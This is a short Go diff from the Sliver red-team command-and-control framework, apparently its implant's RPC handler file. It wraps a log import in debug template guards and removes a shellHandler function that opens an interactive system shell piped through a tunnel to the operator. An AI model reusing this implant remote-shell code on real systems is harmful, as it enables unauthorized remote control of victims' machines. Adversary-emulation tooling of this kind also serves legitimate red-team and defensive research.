@@ -7,38 +7,19 @@ import (
 	"fmt"
 	"io"
 	"io/ioutil"
+
+	// {{if .Debug}}
 	"log"
+	// {{end}}
+
 	"os"
 	"path/filepath"
 	pb "sliver/protobuf/sliver"
 	"sliver/sliver/procdump"
 	"sliver/sliver/ps"
-	"sliver/sliver/shell"
-	"sliver/sliver/transports"
 
 	"github.com/golang/protobuf/proto"
 )
-
-func shellHandler(req []byte, resp RPCResponse) {
-
-	shellReq := &pb.ShellReq{}
-	err := proto.Unmarshal(req, shellReq)
-	if err != nil {
-		return
-	}
-
-	shellPath := shell.GetSystemShellPath()
-	systemShell := shell.StartInteractive(shellReq.TunnelID, shellPath, shellReq.EnablePTY)
-	tunnel := transports.Tunnel{
-		ID:     shellReq.TunnelID,
-		Reader: systemShell.Stdout,
-		Writer: systemShell.Stdin,
-	}
-	// {{if .Debug}}
-	log.Printf("Started shell with tunnel ID %d", tunnel.ID)
-	// {{end}}
-
-}
 
 func killHandler(data []byte, resp RPCResponse) {
 	// {{if .Debug}}
